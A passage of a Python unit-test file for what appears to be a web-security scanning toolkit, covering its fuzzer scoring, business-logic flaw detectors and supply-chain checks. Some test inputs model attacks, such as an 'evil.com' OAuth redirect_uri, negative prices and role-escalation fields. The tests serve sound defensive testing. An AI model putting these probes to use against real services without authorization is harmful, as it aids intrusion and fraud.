"""tests/test_large_tools_coverage.py

Comprehensive tests for the largest untested tools/ modules.
Covers: tool_registry, active_fuzzer, logic_flaw_engine, supply_chain_analyzer,
universal_executor, history_manager, protocol_analyzer, api_server, analysis_pipeline.
"""

import asyncio
import hashlib
import json
import os
import struct
import sys
import tempfile
import time
import uuid
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))


# ---------------------------------------------------------------------------
# tool_registry.py
# ---------------------------------------------------------------------------


class TestToolCategory:
    def test_enum_values(self):
        from tools.tool_registry import ToolCategory
        assert ToolCategory.RECON.value == "reconnaissance"
        assert ToolCategory.SCANNER.value == "vulnerability_scanner"
        assert ToolCategory.FUZZING.value == "fuzzing"
        assert ToolCategory.API.value == "api_testing"

    def test_all_categories_exist(self):
        from tools.tool_registry import ToolCategory
        assert len(ToolCategory) >= 9


class TestToolPriority:
    def test_enum_ordering(self):
        from tools.tool_registry import ToolPriority
        assert ToolPriority.CRITICAL.value == 1
        assert ToolPriority.HIGH.value == 2
        assert ToolPriority.MEDIUM.value == 3
        assert ToolPriority.LOW.value == 4


class TestToolResult:
    def _make_result(self, **kwargs):
        from tools.tool_registry import ToolResult, ToolCategory
        defaults = dict(
            success=True, tool_name="test_tool", category=ToolCategory.SCANNER,
            output="test output", findings=[], execution_time=1.0,
        )
        defaults.update(kwargs)
        return ToolResult(**defaults)

    def test_to_dict_basic(self):
        d = self._make_result().to_dict()
        assert d["success"] is True
        assert d["tool_name"] == "test_tool"
        assert d["category"] == "vulnerability_scanner"
        assert d["findings_count"] == 0
        assert d["error"] is None

    def test_to_dict_truncates_long_output(self):
        d = self._make_result(output="x" * 1000).to_dict()
        assert len(d["output"]) == 500

    def test_to_dict_short_output(self):
        assert self._make_result(output="short").to_dict()["output"] == "short"

    def test_to_dict_with_findings(self):
        r = self._make_result(findings=[{"type": "xss"}, {"type": "sqli"}])
        assert r.to_dict()["findings_count"] == 2

    def test_to_dict_with_error(self):
        d = self._make_result(success=False, error_message="boom").to_dict()
        assert d["error"] == "boom"


class TestToolMetadata:
    def test_creation(self):
        from tools.tool_registry import ToolMetadata, ToolCategory, ToolPriority
        m = ToolMetadata(name="test", category=ToolCategory.SCANNER,
                         priority=ToolPriority.HIGH, binary_name="test_bin", description="A test tool")
        assert m.name == "test"
        assert m.requires_target is True
        assert m.timeout_seconds == 300


class TestToolRegistry:
    def setup_method(self):
        from tools.tool_registry import ToolRegistry
        ToolRegistry._instance = None
        self.registry = ToolRegistry()

    def test_singleton(self):
        from tools.tool_registry import ToolRegistry
        r1, r2 = ToolRegistry(), ToolRegistry()
        assert r1 is r2

    def test_register_and_get(self):
        from tools.tool_registry import BaseTool, ToolMetadata, ToolCategory, ToolPriority
        class Dummy(BaseTool):
            def _check_binary(self): return True
            async def execute(self, *a, **kw): pass
        meta = ToolMetadata(name="dummy_reg_tool", category=ToolCategory.SCANNER,
                            priority=ToolPriority.LOW, binary_name="python3", description="d")
        self.registry.register(Dummy(meta))
        assert self.registry.get_tool("dummy_reg_tool") is not None

    def test_unregister(self):
        from tools.tool_registry import BaseTool, ToolMetadata, ToolCategory, ToolPriority
        class Dummy(BaseTool):
            def _check_binary(self): return True
            async def execute(self, *a, **kw): pass
        meta = ToolMetadata(name="dummy_unreg", category=ToolCategory.FUZZING,
                            priority=ToolPriority.LOW, binary_name="python3", description="d")
        self.registry.register(Dummy(meta))
        self.registry.unregister("dummy_unreg")
        assert self.registry.get_tool("dummy_unreg") is None

    def test_get_tools_by_category(self):
        from tools.tool_registry import BaseTool, ToolMetadata, ToolCategory, ToolPriority
        class Dummy(BaseTool):
            def _check_binary(self): return True
            async def execute(self, *a, **kw): pass
        meta = ToolMetadata(name="dummy_cat", category=ToolCategory.RECON,
                            priority=ToolPriority.MEDIUM, binary_name="python3", description="d")
        self.registry.register(Dummy(meta))
        tools = self.registry.get_tools_by_category(ToolCategory.RECON)
        assert any(t.metadata.name == "dummy_cat" for t in tools)

    def test_list_available_tools(self):
        from tools.tool_registry import BaseTool, ToolMetadata, ToolCategory, ToolPriority
        class Dummy(BaseTool):
            def _check_binary(self): return True
            async def execute(self, *a, **kw): pass
        meta = ToolMetadata(name="dummy_list", category=ToolCategory.API,
                            priority=ToolPriority.HIGH, binary_name="python3", description="d")
        self.registry.register(Dummy(meta))
        avail = self.registry.list_available_tools()
        assert "dummy_list" in avail
        assert avail["dummy_list"]["priority"] == "HIGH"

    def test_get_recommended_chain(self):
        assert isinstance(self.registry.get_recommended_chain("web"), list)
        assert isinstance(self.registry.get_recommended_chain("api"), list)
        assert isinstance(self.registry.get_recommended_chain("network"), list)
        assert isinstance(self.registry.get_recommended_chain("unknown"), list)


class TestRegisterToolDecorator:
    def test_decorator_registers(self):
        from tools.tool_registry import register_tool, BaseTool, ToolMetadata, ToolCategory, ToolPriority, registry
        @register_tool(ToolMetadata(name="deco_test", category=ToolCategory.NETWORK,
                                    priority=ToolPriority.LOW, binary_name="python3", description="d"))
        class DecoTool(BaseTool):
            def _check_binary(self): return True
            async def execute(self, *a, **kw): pass
        assert registry.get_tool("deco_test") is not None

    def test_decorator_rejects_non_basetool(self):
        from tools.tool_registry import register_tool, ToolMetadata, ToolCategory, ToolPriority
        with pytest.raises(TypeError):
            @register_tool(ToolMetadata(name="bad", category=ToolCategory.SCANNER,
                                        priority=ToolPriority.LOW, binary_name="python3", description="d"))
            class NotATool:
                pass


class TestAutoDiscoverTools:
    def test_returns_list(self):
        from tools.tool_registry import auto_discover_tools
        assert isinstance(auto_discover_tools(), list)


class TestBaseToolBinaryCheck:
    def test_available(self):
        from tools.tool_registry import BaseTool, ToolMetadata, ToolCategory, ToolPriority
        class T(BaseTool):
            async def execute(self, *a, **kw): pass
        t = T(ToolMetadata(name="x", category=ToolCategory.SCANNER, priority=ToolPriority.LOW,
                           binary_name="python3", description="d"))
        assert t.is_available is True

    def test_missing(self):
        from tools.tool_registry import BaseTool, ToolMetadata, ToolCategory, ToolPriority
        class T(BaseTool):
            async def execute(self, *a, **kw): pass
        t = T(ToolMetadata(name="x", category=ToolCategory.SCANNER, priority=ToolPriority.LOW,
                           binary_name="nonexistent_binary_xyz_999", description="d"))
        assert t.is_available is False


# ---------------------------------------------------------------------------
# active_fuzzer.py
# ---------------------------------------------------------------------------


class TestFuzzerConfig:
    def test_defaults(self):
        from tools.active_fuzzer import FuzzerConfig
        c = FuzzerConfig()
        assert c.timeout_seconds == 8.0
        assert c.max_retries == 2
        assert c.interesting_threshold == 0.5
        assert c.verify_ssl is False


class TestBaselineResponse:
    def test_creation(self):
        from tools.active_fuzzer import BaselineResponse
        br = BaselineResponse(status=200, length=100, elapsed_ms=50.0,
                              body_hash="abc", body="hello", headers={}, url="http://test")
        assert br.status == 200
        assert br.body == "hello"


class TestResponseDelta:
    def test_creation(self):
        from tools.active_fuzzer import ResponseDelta
        rd = ResponseDelta(status_changed=True, status_before=200, status_after=500,
                           length_diff=50, length_diff_pct=0.5, time_diff_ms=100.0,
                           time_ratio=2.0, body_hash_changed=True, error_indicator=True,
                           auth_indicator=False, sql_error_in_body=False, reflection_indicator=False)
        assert rd.status_changed is True
        assert rd.error_indicator is True


class TestDetectSqlError:
    def test_detected(self):
        from tools.active_fuzzer import _detect_sql_error
        assert _detect_sql_error("mysql_fetch_array() failed") is True
        assert _detect_sql_error("sql syntax error near") is True
        assert _detect_sql_error("ORA-01756: quoted string") is True
        assert _detect_sql_error("postgresql error at line 5") is True

    def test_not_detected(self):
        from tools.active_fuzzer import _detect_sql_error
        assert _detect_sql_error("Hello world") is False
        assert _detect_sql_error("") is False


class TestDetectReflection:
    def test_detected(self):
        from tools.active_fuzzer import _detect_reflection
        assert _detect_reflection("test123", "body with test123 inside") is True

    def test_short_payload(self):
        from tools.active_fuzzer import _detect_reflection
        assert _detect_reflection("ab", "body") is False

    def test_empty(self):
        from tools.active_fuzzer import _detect_reflection
        assert _detect_reflection("", "body") is False

    def test_not_found(self):
        from tools.active_fuzzer import _detect_reflection
        assert _detect_reflection("xyz789", "something else") is False


class TestComputeDelta:
    def _baseline(self, **kw):
        from tools.active_fuzzer import BaselineResponse
        body = kw.pop("body", "baseline")
        defaults = dict(status=200, length=len(body), elapsed_ms=50.0,
                        body_hash=hashlib.sha256(body.encode()).hexdigest(),
                        body=body, headers={}, url="")
        defaults.update(kw)
        return BaselineResponse(**defaults)

    def test_same_response(self):
        from tools.active_fuzzer import compute_delta
        b = self._baseline()
        d = compute_delta(b, 200, "baseline", 50.0)
        assert d.status_changed is False
        assert d.body_hash_changed is False
        assert d.error_indicator is False
        assert d.auth_indicator is False

    def test_status_changed_5xx(self):
        from tools.active_fuzzer import compute_delta
        b = self._baseline()
        d = compute_delta(b, 500, "error page", 50.0)
        assert d.status_changed is True
        assert d.error_indicator is True
        assert d.status_before == 200
        assert d.status_after == 500

    def test_auth_indicator(self):
        from tools.active_fuzzer import compute_delta
        b = self._baseline()
        d = compute_delta(b, 403, "forbidden", 50.0)
        assert d.auth_indicator is True

    def test_body_changed(self):
        from tools.active_fuzzer import compute_delta
        b = self._baseline(body_hash="aaa")
        d = compute_delta(b, 200, "completely different content here", 50.0)
        assert d.body_hash_changed is True

    def test_length_diff_pct_capped(self):
        from tools.active_fuzzer import compute_delta
        b = self._baseline(length=10)
        d = compute_delta(b, 200, "x" * 1000, 50.0)
        assert d.length_diff_pct <= 1.0

    def test_sql_error_in_body(self):
        from tools.active_fuzzer import compute_delta
        b = self._baseline()
        d = compute_delta(b, 500, "mysql_fetch_array error", 50.0)
        assert d.sql_error_in_body is True


class TestScoreDelta:
    def _delta(self, **kw):
        from tools.active_fuzzer import ResponseDelta
        defaults = dict(status_changed=False, status_before=200, status_after=200,
                        length_diff=0, length_diff_pct=0.0, time_diff_ms=0.0,
                        time_ratio=1.0, body_hash_changed=False, error_indicator=False,
                        auth_indicator=False, sql_error_in_body=False, reflection_indicator=False)
        defaults.update(kw)
        return ResponseDelta(**defaults)

    def test_no_signal(self):
        from tools.active_fuzzer import score_delta
        score, reason = score_delta(self._delta())
        assert score == 0.0
        assert "no signal" in reason

    def test_error_indicator(self):
        from tools.active_fuzzer import score_delta
        score, reason = score_delta(self._delta(error_indicator=True, status_after=500))
        assert score >= 0.40

    def test_auth_indicator(self):
        from tools.active_fuzzer import score_delta
        score, _ = score_delta(self._delta(auth_indicator=True))
        assert score >= 0.30

    def test_sql_error(self):
        from tools.active_fuzzer import score_delta
        score, _ = score_delta(self._delta(sql_error_in_body=True))
        assert score >= 0.25

    def test_reflection(self):
        from tools.active_fuzzer import score_delta
        score, _ = score_delta(self._delta(reflection_indicator=True))
        assert score >= 0.15

    def test_time_ratio_high(self):
        from tools.active_fuzzer import score_delta
        score, _ = score_delta(self._delta(time_ratio=3.0, time_diff_ms=600))
        assert score >= 0.20

    def test_body_hash_large_diff(self):
        from tools.active_fuzzer import score_delta
        score, _ = score_delta(self._delta(body_hash_changed=True, length_diff_pct=0.7))
        assert score >= 0.25

    def test_score_capped_at_1(self):
        from tools.active_fuzzer import score_delta
        d = self._delta(error_indicator=True, auth_indicator=True, sql_error_in_body=True,
                        reflection_indicator=True, body_hash_changed=True, length_diff_pct=0.8,
                        time_ratio=3.0, time_diff_ms=600)
        score, _ = score_delta(d)
        assert score <= 1.0

    def test_combined_signals(self):
        from tools.active_fuzzer import score_delta
        score, _ = score_delta(self._delta(error_indicator=True, auth_indicator=True, sql_error_in_body=True))
        assert score > 0.5


class TestFuzzerSummarize:
    def test_empty(self):
        from tools.active_fuzzer import ActiveFuzzer
        r = ActiveFuzzer().summarize([])
        assert r["total"] == 0
        assert r["interesting"] == 0

    def test_with_results(self):
        from tools.active_fuzzer import ActiveFuzzer, FuzzResult, ResponseDelta
        delta = ResponseDelta(status_changed=True, status_before=200, status_after=500,
                              length_diff=0, length_diff_pct=0.0, time_diff_ms=0.0,
                              time_ratio=1.0, body_hash_changed=True, error_indicator=True,
                              auth_indicator=False, sql_error_in_body=False, reflection_indicator=False)
        r1 = FuzzResult(payload="x", injection_point="param:q", method="GET", url="http://t",
                        status=500, response_length=100, elapsed_ms=50.0, delta=delta,
                        score=0.8, is_interesting=True, reasoning="5xx", body_snippet="err")
        r2 = FuzzResult(payload="y", injection_point="param:q", method="GET", url="http://t",
                        status=200, response_length=100, elapsed_ms=50.0, delta=delta,
                        score=0.1, is_interesting=False, reasoning="no signal", body_snippet="ok")
        result = ActiveFuzzer().summarize([r1, r2])
        assert result["total"] == 2
        assert result["interesting"] == 1
        assert result["top_score"] == 0.8
        assert "server_error" in result["categories"]


# ---------------------------------------------------------------------------
# logic_flaw_engine.py
# ---------------------------------------------------------------------------


class TestSeverity:
    def test_values(self):
        from tools.logic_flaw_engine import Severity
        assert Severity.INFO.value == "info"
        assert Severity.INFO.weight == 1
        assert Severity.CRITICAL.weight == 20

    def test_ordering(self):
        from tools.logic_flaw_engine import Severity
        assert Severity.LOW.weight < Severity.MEDIUM.weight < Severity.HIGH.weight


class TestDetectorCategory:
    def test_all_values(self):
        from tools.logic_flaw_engine import DetectorCategory
        vals = [c.value for c in DetectorCategory]
        assert "price_manipulation" in vals
        assert "race_condition" in vals
        assert "authorization" in vals


class TestEvidence:
    def test_creation(self):
        from tools.logic_flaw_engine import Evidence
        e = Evidence(kind="test", description="desc", data={"key": "val"})
        assert e.kind == "test"
        assert e.data["key"] == "val"


class TestLogicFinding:
    def test_auto_id(self):
        from tools.logic_flaw_engine import LogicFinding
        f = LogicFinding(title="t", target="x", endpoint="/api")
        assert f.finding_id.startswith("LFE-")
        assert len(f.finding_id) == 16

    def test_auto_cwe(self):
        from tools.logic_flaw_engine import LogicFinding, DetectorCategory
        f = LogicFinding(title="t", target="x", endpoint="/api", category=DetectorCategory.AUTH_LOGIC)
        assert len(f.cwe) > 0

    def test_add_evidence(self):
        from tools.logic_flaw_engine import LogicFinding
        f = LogicFinding(title="t", target="x", endpoint="/api")
        f.add_evidence("test", "desc", {"k": "v"})
        assert len(f.evidence) == 1
        assert f.evidence[0].kind == "test"

    def test_to_dict(self):
        from tools.logic_flaw_engine import LogicFinding
        d = LogicFinding(title="t", target="x", endpoint="/api").to_dict()
        assert d["title"] == "t"
        assert "finding_id" in d
        assert isinstance(d["evidence"], list)


class TestNormalizeEndpoint:
    def test_string_input(self):
        from tools.logic_flaw_engine import normalize_endpoint
        ep = normalize_endpoint("https://example.com/api?key=val")
        assert ep["method"] == "GET"
        assert ep["params"]["key"] == "val"

    def test_dict_input(self):
        from tools.logic_flaw_engine import normalize_endpoint
        ep = normalize_endpoint({"url": "https://example.com/api", "method": "post", "body": {"name": "t"}})
        assert ep["method"] == "POST"

    def test_dict_query_params(self):
        from tools.logic_flaw_engine import normalize_endpoint
        ep = normalize_endpoint({"url": "https://example.com/api?id=123"})
        assert ep["params"]["id"] == "123"


class TestEndpointPredicates:
    def test_is_price_endpoint(self):
        from tools.logic_flaw_engine import is_price_endpoint
        assert is_price_endpoint("https://api.com/pay") is True
        assert is_price_endpoint("https://api.com/users") is False
        assert is_price_endpoint({"url": "/checkout", "body": {"price": 10}}) is True

    def test_is_discount_endpoint(self):
        from tools.logic_flaw_engine import is_discount_endpoint
        assert is_discount_endpoint("https://api.com/coupon/apply") is True
        assert is_discount_endpoint("https://api.com/users") is False

    def test_is_auth_endpoint(self):
        from tools.logic_flaw_engine import is_auth_endpoint
        assert is_auth_endpoint("https://api.com/login") is True
        assert is_auth_endpoint("https://api.com/health") is False

    def test_is_workflow_endpoint(self):
        from tools.logic_flaw_engine import is_workflow_endpoint
        assert is_workflow_endpoint("https://api.com/onboard/step2") is True
        assert is_workflow_endpoint("https://api.com/users") is False


class TestUUIDV1Decoder:
    def test_is_uuid_v1(self):
        from tools.logic_flaw_engine import UUIDV1Decoder
        assert UUIDV1Decoder.is_uuid_v1(str(uuid.uuid1())) is True

    def test_not_uuid_v1(self):
        from tools.logic_flaw_engine import UUIDV1Decoder
        assert UUIDV1Decoder.is_uuid_v1(str(uuid.uuid4())) is False

    def test_not_valid_format(self):
        from tools.logic_flaw_engine import UUIDV1Decoder
        assert UUIDV1Decoder.is_uuid_v1("not-a-uuid") is False

    def test_extract_timestamp(self):
        from tools.logic_flaw_engine import UUIDV1Decoder
        ts = UUIDV1Decoder.extract_timestamp_ms(str(uuid.uuid1()))
        assert ts is not None and ts > 0

    def test_extract_timestamp_v4_none(self):
        from tools.logic_flaw_engine import UUIDV1Decoder
        assert UUIDV1Decoder.extract_timestamp_ms(str(uuid.uuid4())) is None


# --- Detectors (use asyncio.run) ---


def _run_async(coro):
    return asyncio.run(coro)


class TestPriceManipulationDetector:
    def test_negative_amount(self):
        from tools.logic_flaw_engine import PriceManipulationDetector
        det = PriceManipulationDetector()
        findings = _run_async(det.detect("target", [{"url": "https://api.com/pay", "body": {"price": 10}}]))
        assert any("Negative" in f.title for f in findings)

    def test_quantity(self):
        from tools.logic_flaw_engine import PriceManipulationDetector
        findings = _run_async(PriceManipulationDetector().detect("target", [
            {"url": "https://api.com/order", "body": {"quantity": 5}}]))
        assert any("Quantity" in f.title for f in findings)

    def test_no_price_endpoint(self):
        from tools.logic_flaw_engine import PriceManipulationDetector
        findings = _run_async(PriceManipulationDetector().detect("target", [
            {"url": "https://api.com/users", "body": {"name": "t"}}]))
        assert len(findings) == 0

    def test_currency_confusion(self):
        from tools.logic_flaw_engine import PriceManipulationDetector
        findings = _run_async(PriceManipulationDetector().detect("target", [
            {"url": "https://api.com/pay", "body": {"currency": "JPY", "amount": 100}}]))
        assert any("currency_confusion" in f.tags for f in findings)

    def test_discount_stacking(self):
        from tools.logic_flaw_engine import PriceManipulationDetector
        findings = _run_async(PriceManipulationDetector().detect("target", [
            {"url": "https://api.com/coupon/apply", "body": {"coupon": "SAVE20"}}]))
        assert any("Coupon" in f.title for f in findings)


class TestRaceConditionDetector:
    def test_detect_on_transfer(self):
        from tools.logic_flaw_engine import RaceConditionDetector
        findings = _run_async(RaceConditionDetector().detect("target", [
            {"url": "https://api.com/transfer", "method": "POST"}]))
        assert any("race" in f.tags for f in findings)

    def test_no_race_on_get(self):
        from tools.logic_flaw_engine import RaceConditionDetector
        findings = _run_async(RaceConditionDetector().detect("target", [
            {"url": "https://api.com/transfer", "method": "GET"}]))
        assert len(findings) == 0


class TestStateMachineBypassDetector:
    def test_step_param(self):
        from tools.logic_flaw_engine import StateMachineBypassDetector
        findings = _run_async(StateMachineBypassDetector().detect("target", [
            {"url": "https://api.com/onboard", "params": {"step": "3"}}]))
        assert any("state_skip" in f.tags for f in findings)

    def test_deep_link(self):
        from tools.logic_flaw_engine import StateMachineBypassDetector
        findings = _run_async(StateMachineBypassDetector().detect("target", [
            {"url": "https://api.com/wizard/step-3"}]))
        assert any("deep_link" in f.tags for f in findings)

    def test_admin_path(self):
        from tools.logic_flaw_engine import StateMachineBypassDetector
        findings = _run_async(StateMachineBypassDetector().detect("target", [
            {"url": "https://api.com/admin/dashboard"}]))
        assert any("admin" in f.tags for f in findings)


class TestAuthLogicDetector:
    def test_password_reset(self):
        from tools.logic_flaw_engine import AuthLogicDetector
        findings = _run_async(AuthLogicDetector().detect("target", [
            {"url": "https://api.com/reset-password"}]))
        assert any("reset_token" in f.tags for f in findings)

    def test_2fa_bypass(self):
        from tools.logic_flaw_engine import AuthLogicDetector
        findings = _run_async(AuthLogicDetector().detect("target", [
            {"url": "https://api.com/verify-otp"}]))
        assert any("2fa_bypass" in f.tags for f in findings)

    def test_session_fixation(self):
        from tools.logic_flaw_engine import AuthLogicDetector
        findings = _run_async(AuthLogicDetector().detect("target", [
            {"url": "https://api.com/login"}]))
        assert any("session_fixation" in f.tags for f in findings)

    def test_oauth_missing_state(self):
        from tools.logic_flaw_engine import AuthLogicDetector
        findings = _run_async(AuthLogicDetector().detect("target", [
            {"url": "https://api.com/authorize", "params": {"redirect_uri": "http://evil.com"}}]))
        assert any("missing_state" in f.tags for f in findings)


class TestAuthorizationDetector:
    def test_sequential_ids(self):
        from tools.logic_flaw_engine import AuthorizationDetector
        findings = _run_async(AuthorizationDetector().detect("target", [
            {"url": "https://api.com/users/1"}, {"url": "https://api.com/users/2"},
            {"url": "https://api.com/users/3"}]))
        assert any("bola" in f.tags for f in findings)

    def test_role_param(self):
        from tools.logic_flaw_engine import AuthorizationDetector
        findings = _run_async(AuthorizationDetector().detect("target", [
            {"url": "https://api.com/settings", "body": {"role": "admin"}}]))
        assert any("bfla" in f.tags for f in findings)

    def test_admin_path(self):
        from tools.logic_flaw_engine import AuthorizationDetector
        findings = _run_async(AuthorizationDetector().detect("target", [
            {"url": "https://api.com/admin/users"}]))
        assert any("bfla" in f.tags for f in findings)

    def test_multi_tenant(self):
        from tools.logic_flaw_engine import AuthorizationDetector
        findings = _run_async(AuthorizationDetector().detect("target", [
            {"url": "https://api.com/org/123/data"}]))
        assert any("multi_tenant" in f.tags for f in findings)


class TestWorkflowIntegrityDetector:
    def test_missing_idempotency(self):
        from tools.logic_flaw_engine import WorkflowIntegrityDetector
        findings = _run_async(WorkflowIntegrityDetector().detect("target", [
            {"url": "https://api.com/pay", "method": "POST", "body": {"amount": 10}}]))
        assert any("idempotency" in f.tags for f in findings)

    def test_force_param(self):
        from tools.logic_flaw_engine import WorkflowIntegrityDetector
        findings = _run_async(WorkflowIntegrityDetector().detect("target", [
            {"url": "https://api.com/checkout", "method": "POST", "body": {"force": "true"}}]))
        assert any("force_param" in f.tags for f in findings)


class TestBusinessConstraintDetector:
    def test_client_timestamp(self):
        from tools.logic_flaw_engine import BusinessConstraintDetector
        findings = _run_async(BusinessConstraintDetector().detect("target", [
            {"url": "https://api.com/order", "body": {"timestamp": "2024-01-01"}}]))
        assert any("client_time" in f.tags for f in findings)

    def test_kyc_bypass(self):
        from tools.logic_flaw_engine import BusinessConstraintDetector
        findings = _run_async(BusinessConstraintDetector().detect("target", [
            {"url": "https://api.com/trade", "body": {"verified": "true"}}]))
        assert any("kyc" in f.tags for f in findings)


class TestInferenceEngine:
    def test_score_unique(self):
        from tools.logic_flaw_engine import InferenceEngine, LogicFinding
        f = LogicFinding(title="t", target="x", endpoint="/unique")
        InferenceEngine().score(f, [f])
        assert f.novelty >= 0.7
        assert f.impact_score > 0

    def test_score_duplicate(self):
        from tools.logic_flaw_engine import InferenceEngine, LogicFinding
        f1 = LogicFinding(title="t1", target="x", endpoint="/same")
        f2 = LogicFinding(title="t2", target="x", endpoint="/same")
        InferenceEngine().score(f1, [f1, f2])
        assert f1.novelty <= 0.3

    def test_risk_score(self):
        from tools.logic_flaw_engine import InferenceEngine, LogicFinding
        f = LogicFinding(title="t", target="x", endpoint="/api", confidence=0.8)
        InferenceEngine().score(f, [f])
        assert f.risk_score > 0


class TestCorrelationEngine:
    def test_race_bola_chain(self):
        from tools.logic_flaw_engine import CorrelationEngine, LogicFinding, DetectorCategory
        f1 = LogicFinding(title="race", target="x", endpoint="/pay", category=DetectorCategory.RACE_CONDITION)
        f1.tags = ["race"]
        f2 = LogicFinding(title="bola", target="x", endpoint="/users/1", category=DetectorCategory.AUTHORIZATION)
        f2.tags = ["bola", "sequential_id"]
        chains = CorrelationEngine().correlate([f1, f2])
        assert len(chains) >= 1
        assert "race" in chains[0].tags

    def test_currency_negative_chain(self):
        from tools.logic_flaw_engine import CorrelationEngine, LogicFinding
        f1 = LogicFinding(title="c", target="x", endpoint="/pay")
        f1.tags = ["currency_confusion"]
        f2 = LogicFinding(title="n", target="x", endpoint="/pay")
        f2.tags = ["negative_amount"]
        chains = CorrelationEngine().correlate([f1, f2])
        assert any("currency" in c.tags for c in chains)

    def test_empty(self):
        from tools.logic_flaw_engine import CorrelationEngine
        assert CorrelationEngine().correlate([]) == []


class TestLogicFlawEngine:
    def test_init(self):
        from tools.logic_flaw_engine import LogicFlawEngine
        e = LogicFlawEngine()
        assert len(e.detectors) == 7

    def test_analyze(self):
        from tools.logic_flaw_engine import LogicFlawEngine
        findings = _run_async(LogicFlawEngine().analyze("target", [
            {"url": "https://api.com/pay", "body": {"price": 10}},
            {"url": "https://api.com/login"}]))
        assert isinstance(findings, list)

    def test_aclose(self):
        from tools.logic_flaw_engine import LogicFlawEngine
        e = LogicFlawEngine()
        _run_async(e.aclose())
        assert e._closed is True


class TestLogicFlawBackCompat:
    def test_logic_flaw(self):
        from tools.logic_flaw_engine import LogicFlaw
        f = LogicFlaw(flaw_type="xss", endpoint="/api", description="test", severity="High", confidence=0.8)
        assert f.flaw_type == "xss"

    def test_logic_flaw_result(self):
        from tools.logic_flaw_engine import LogicFlaw, LogicFlawResult
        f1 = LogicFlaw(flaw_type="xss", endpoint="/api", description="t", severity="High")
        f2 = LogicFlaw(flaw_type="sqli", endpoint="/api2", description="t2", severity="Critical")
        r = LogicFlawResult(target="test.com", flaws=[f1, f2])
        assert r.is_vulnerable is True
        s = r.summary()
        assert s["total_flaws"] == 2

    def test_logic_flaw_result_empty(self):
        from tools.logic_flaw_engine import LogicFlawResult
        assert LogicFlawResult(target="x").is_vulnerable is False


# ---------------------------------------------------------------------------
# supply_chain_analyzer.py
# ---------------------------------------------------------------------------


class TestSupplyChainSeverity:
    def test_rank(self):
        from tools.supply_chain_analyzer import Severity
        assert Severity.rank("info") == 0
        assert Severity.rank("critical") == 4

    def test_max(self):
        from tools.supply_chain_analyzer import Severity
        assert Severity.max("low", "high", "medium") == "high"
        assert Severity.max("unknown", "info") == "info"


class TestVersion:
    def test_parse(self):
        from tools.supply_chain_analyzer import Version
        v = Version.parse("1.2.3")
        assert (v.major, v.minor, v.patch) == (1, 2, 3)

    def test_parse_prerelease(self):
        from tools.supply_chain_analyzer import Version
        assert Version.parse("1.0.0-beta").pre == "beta"

    def test_parse_v_prefix(self):
        from tools.supply_chain_analyzer import Version
        assert Version.parse("v2.0.1").major == 2

    def test_comparison(self):
        from tools.supply_chain_analyzer import Version
        assert Version.parse("1.0.0") < Version.parse("2.0.0")
        assert Version.parse("1.1.0") > Version.parse("1.0.0")
        assert Version.parse("1.0.0-beta") < Version.parse("1.0.0")

    def test_str(self):
        from tools.supply_chain_analyzer import Version
        assert str(Version.parse("1.2.3")) == "1.2.3"
        assert str(Version.parse("1.0.0-alpha")) == "1.0.0-alpha"


class TestComponent:
    def test_purl_with_version(self):
        from tools.supply_chain_analyzer import Component
        assert Component(name="r", version="2.28.0", ecosystem="pypi").purl() == "pkg:pypi/r@2.28.0"

    def test_purl_without_version(self):
        from tools.supply_chain_analyzer import Component
        assert Component(name="r", ecosystem="pypi").purl() == "pkg:pypi/r"


class TestVersionInRange:
    def test_wildcard(self):
        from tools.supply_chain_analyzer import version_in_range
        assert version_in_range("1.0.0", "*") is True
        assert version_in_range("1.0.0", "latest") is True

    def test_exact(self):
        from tools.supply_chain_analyzer import version_in_range
        assert version_in_range("1.2.3", "==1.2.3") is True
        assert version_in_range("1.2.4", "==1.2.3") is False

    def test_comparators(self):
        from tools.supply_chain_analyzer import version_in_range
        assert version_in_range("2.0.0", ">=1.0.0") is True
        assert version_in_range("0.9.0", ">=1.0.0") is False
        assert version_in_range("1.0.0", "<=1.0.0") is True
        assert version_in_range("1.0.1", "<=1.0.0") is False
        assert version_in_range("1.0.1", ">1.0.0") is True
        assert version_in_range("0.9.0", "<1.0.0") is True
        assert version_in_range("1.0.1", "!=1.0.0") is True
        assert version_in_range("1.0.0", "!=1.0.0") is False

    def test_compatible_release(self):
        from tools.supply_chain_analyzer import version_in_range
        assert version_in_range("1.5.0", "~=1.0.0") is True
        assert version_in_range("2.0.0", "~=1.0.0") is False
        assert version_in_range("0.8.5", "~=0.8.0") is True
        assert version_in_range("0.9.0", "~=0.8.0") is False
        assert version_in_range("1.0.0", "~=0.8.0") is False

    def test_comma_separated(self):
        from tools.supply_chain_analyzer import version_in_range
        assert version_in_range("1.5.0", ">=1.0.0,<2.0.0") is True
        assert version_in_range("2.1.0", ">=1.0.0,<2.0.0") is False

    def test_bare_version(self):
        from tools.supply_chain_analyzer import version_in_range
        assert version_in_range("1.2.3", "1.2.3") is True
        assert version_in_range("1.2.4", "1.2.3") is False


class TestSpdxParsing:
    def test_simple(self):
        from tools.supply_chain_analyzer import parse_spdx
        assert parse_spdx("MIT") == ["MIT"]

    def test_compound(self):
        from tools.supply_chain_analyzer import parse_spdx
        r = parse_spdx("MIT AND Apache-2.0")
        assert "MIT" in r and "Apache-2.0" in r

    def test_empty(self):
        from tools.supply_chain_analyzer import parse_spdx
        assert parse_spdx("") == []


class TestTyposquat:
    def test_similar(self):
        from tools.supply_chain_analyzer import find_typosquats
        r = find_typosquats("reqests", threshold=0.7)
        assert len(r) > 0
        assert r[0][0] == "requests"

    def test_exact_excluded(self):
        from tools.supply_chain_analyzer import find_typosquats
        r = find_typosquats("requests", threshold=0.9)
        assert all(n != "requests" for n, _ in r)

    def test_no_match(self):
        from tools.supply_chain_analyzer import find_typosquats
        assert len(find_typosquats("zzzzzzzzz", threshold=0.9)) == 0


class TestDependencyConfusion:
    def test_scoped(self):
        from tools.supply_chain_analyzer import detect_dependency_confusion, Component
        f = detect_dependency_confusion([Component(name="@co/lib", version="1.0", ecosystem="npm")])
        assert len(f) > 0 and f[0].severity == "high"

    def test_normal(self):
        from tools.supply_chain_analyzer import detect_dependency_confusion, Component
        assert len(detect_dependency_confusion([Component(name="requests", version="2.28")])) == 0


class TestCVELookup:
    def test_known(self):
        from tools.supply_chain_analyzer import lookup_cves, Component
        f = lookup_cves([Component(name="django", version="3.1.0", ecosystem="pypi")])
        assert len(f) > 0

    def test_no_version(self):
        from tools.supply_chain_analyzer import lookup_cves, Component
        assert len(lookup_cves([Component(name="django", version="", ecosystem="pypi")])) == 0

    def test_safe_version(self):
